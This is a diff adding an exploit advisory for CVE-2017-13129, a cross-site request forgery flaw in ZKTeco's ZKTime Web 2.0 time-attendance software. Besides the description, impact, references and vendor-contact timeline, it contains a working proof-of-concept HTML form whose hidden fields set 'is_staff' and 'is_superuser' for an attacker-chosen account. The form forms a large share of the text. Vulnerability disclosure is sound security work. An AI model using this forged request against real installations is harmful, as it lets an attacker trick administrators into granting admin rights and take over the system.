@@ -1,0 +1,83 @@
+Exploit Title: ZKTime Web Software 2.0 - Cross Site Request Forgery
+CVE-ID: CVE-2017-13129
+Vendor Homepage: https://www.zkteco.com/product/ZKTime_Web_2.0_435.html
+Vendor of Product: ZKTeco
+Affected Product Code: ZKTime Web - 2.0.1.12280
+Category: WebApps
+Author: Arvind V.
+Author Social: @Find_Arvind
+
+------------------------------------------
+
+Product description:
+ZKTime Web 2.0 is a cutting edge Web-based Time Attendance software, which
+provided a stable communication for devices through GPRS/WAN, hence, users
+can access the software anywhere by their Web Browser to remotely manage
+hundreds of T&A terminals under complex network condition (WLAN). The
+Application has an administrator role and application user role.
+
+Attack Description:
+The ZKTime Web Software allows the Administrator to elevate the privileges
+of the application user by simple click of a radio button namely
+"superuser". However when the request is generated there are no random
+tokens attached to this request to prevent any kind of Cross Site Request
+Forgery attacks. Moreover there no other protections (like administrator
+password verification etc.) mechanisms in place to block any kind of forged
+requests.
+An Attacker takes advantage of this scenario and creates a crafted link to
+add himself as an administrator to the ZKTime Web Software. He then uses
+social engineering methods to trick the administrator into click the forged
+http request. The request is executed and the attacker becomes the
+Administrator of the
+ZKTime Web Software.
+
+Proof of Concept Code:
+Forged HTTP Request used by the attacker:
+<html>
+    <body>
+    <form action="http://XX.XX.XX.46:8081/data/auth/User/14/
+<http://xx.xx.xx.46:8081/data/auth/User/14/>" method="POST">
+      <input type="hidden" name="pk" value="" />
+      <input type="hidden" name="username" value="Pentestuser1" />
+      <input type="hidden" name="Password" value="" />
+      <input type="hidden" name="ResetPassword" value="" />
+      <input type="hidden" name="fpidnum" value="" />
+      <input type="hidden" name="fpcount" value="0" />
+      <input type="hidden" name="tlng" value="en" />
+      <input type="hidden" name="first_name" value="Pentest" />
+      <input type="hidden" name="last_name" value="User" />
+      <input type="hidden" name="email" value="" />
+      <input type="hidden" name="is_staff" value="on" />
+      <input type="hidden" name="is_superuser" value="on" />
+      <input type="hidden" name="last_login" value="2017-08-20 14:14:34" />
+      <input type="hidden" name="initial-last_login" value="2017-08-20
+14:14:34" />
+      <input type="hidden" name="date_joined" value="2017-08-20 14:14:34" />
+      <input type="hidden" name="initial-date_joined" value="2017-08-20
+14:14:34" />
+      <input type="hidden" name="finnger" value="" />
+      <input type="hidden" name="template" value="" />
+      <input type="hidden" name="finger10" value="" />
+      <input type="hidden" name="template10" value="" />
+      <input type="hidden" name="delfp" value="" />
+      <input type="hidden" name="actflag" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+</body>
+</html>
+
+Impact:
+If the vulnerability is successfully exploited than an attacker (who would
+be a normal user of the web application) can escalate his privileges and
+become the administrator of ZK Time Web Software.
+
+References:
+http://seclists.org/fulldisclosure/2017/Sep/38
+http://seclists.org/bugtraq/2017/Sep/19
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-13129
+
+Vulnerability Timeline:
+18th August 2017 – Vulnerability Discovered
+20th August 2017 – Contacted Vendor – No Response
+1st September 2017 – Contacted Vendor again – No Response
+18th September 2017 – Vulnerability Disclosed
